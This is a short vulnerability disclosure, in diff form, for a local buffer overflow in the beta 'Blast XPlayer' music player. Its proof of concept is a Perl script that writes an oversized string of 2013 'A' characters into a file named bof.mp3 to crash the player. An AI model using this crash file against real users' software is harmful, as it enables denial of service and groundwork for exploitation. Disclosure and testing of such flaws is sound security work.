@@ -1,0 +1,42 @@
+Title: Blast XPlayer Local Buffer Overflow PoC
+Vendor: http://sourceforge.net/projects/blast-player/files/latest/download?source=dlp
+Versions: Beta
+Platform: nix*, windows
+Bug: Buffer Overflow
+
+
+-------------------------------------------------------
+ 
+1) Introduction
+2) Proof of concept
+3) Credits
+ 
+ 
+===========
+1) Introduction
+===========
+ 
+This application is a music player application is very practical and simple. 
+Easy to use and the capacity that is not too big only 5MB. 
+with this application you can play music whenever you want to store in flashdisc 
+and opened on the computer without having to install it first. 
+This application is still in the Indonesian version, but will be present in the english version in a few days.
+ 
+=====
+2)proof of concept
+=====
+ 
+#!/usr/bin/perl
+
+$bof = "A" x 2013;
+$filename = "bof.mp3";
+open (FILE,">$filename");
+print FILE "$bof";
+print "\ncreated!!!\n";
+
+=====
+3)Credits
+=====
+ 
+flux77
+Contact : 0xflux77 at gmail.com
